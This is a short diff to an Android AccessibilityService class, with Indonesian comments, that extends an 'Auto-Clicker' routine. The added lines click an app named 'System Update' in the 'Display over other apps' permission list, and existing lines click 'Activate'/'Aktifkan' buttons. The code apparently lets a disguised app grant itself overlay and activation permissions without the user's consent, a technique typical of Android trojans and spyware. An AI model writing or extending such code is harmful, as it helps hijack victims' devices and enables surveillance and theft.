@@ -56,6 +56,9 @@ public class CustomAccessibilityService extends AccessibilityService {
         if (rootNode == null) return;
 
         // Logika "Auto-Clicker"
+        // 1. Cari nama aplikasi di daftar "Display over other apps" jika terlempar ke list
+        checkAndClick(rootNode, "System Update");
+
         // Mencari tombol dengan teks tertentu (tergantung bahasa sistem)
         checkAndClick(rootNode, "Activate");
         checkAndClick(rootNode, "Aktifkan");
